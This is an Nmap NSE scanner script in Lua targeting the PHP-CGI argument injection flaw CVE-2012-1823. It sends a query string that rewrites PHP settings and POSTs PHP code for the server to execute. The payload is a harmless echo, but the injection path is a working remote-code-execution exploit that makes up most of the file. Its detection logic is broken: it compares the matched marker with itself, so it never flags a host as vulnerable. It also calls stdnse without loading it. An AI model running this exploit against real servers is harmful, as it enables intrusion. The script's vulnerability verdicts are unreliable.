local http=require "http"
local shortport = require "shortport"
local vulns = require "vulns"

descripton=[[
PHP CGI Argument Injection Exploit]]
author="m0zh3"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories={"exploit","vuln"}

-- The Rule Section --
portrule = shortport.http
-- The Action Section --


local path ="/?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin%2Esimulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi%2Eforce_redirect%3D0+-d+cgi%2Eredirect_status_env%3D0+-n"
local payload = "<?php echo " .. "\"m00zh33\"" .. ";die();?>"
local status

local function exploit(host, port)
	local ret = http.post(host,port,path,nil,nil,payload)
	local body = string.lower(ret.body)
	for s in string.gmatch(body,"m00zh33") do
		if "m00zh33" ~= s then
                        status = "yes"
                        break
                end
	end
end

action = function(host, port)
	local vuln_table = {
		title = "CVE-2012-1823",
		reference = "http://www.exploit-db.com/exploits/18836/"}
	local report = vulns.Report:new(SCRIPT_NAME, host, port)
	vuln_table.state = vulns.STATE.NOT_VULN
	exploit(host,port)
	stdnse.print_debug(status)
	if status == "yes" then
		vuln_table.state = vulns.STATE.VULN
	end
	return report:make_output(vuln_table)
end
